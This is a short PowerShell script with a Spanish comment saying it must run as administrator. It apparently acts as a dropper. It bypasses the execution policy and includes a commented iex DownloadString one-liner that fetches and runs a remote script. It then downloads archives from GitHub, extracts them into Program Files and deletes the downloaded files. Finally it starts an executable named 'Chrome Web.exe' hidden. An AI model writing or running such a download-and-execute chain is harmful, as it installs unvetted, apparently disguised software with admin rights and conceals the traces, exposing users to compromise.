#HAY QUE EJECUTAR COMO ADMINISTRADOR
#Set-ExecutionPolicy -ExecutionPolicy Bypass -force
#powershell "start-process powershell -verb runas"
#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/proyecto.ps1')"


invoke-webrequest -uri "https://github.com/Admo9/ProJ03/archive/refs/heads/main.zip" -outfile "C:\Users\win64.zip"


Set-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord


[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Install-PackageProvider -Name NuGet -force


Install-Module -Name 7Zip4Powershell -force

Expand-Archive -Path C:\Users\win64.zip -DestinationPath C:\Users\

Expand-7Zip -ArchiveFileName C:\Users\ProJ03-main\app-64.7z.001 -Password "" -TargetPath "C:\Program Files\"

invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile "C:\Users\app.zip"

Expand-Archive -Path C:\Users\app.zip -DestinationPath C:\Users\ProJ03-main\app-64\resources

Remove-Item -Force -Recurse 'C:\Users\win64.zip', 'C:\Users\ProJ03-main', 'app.zip'

Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden
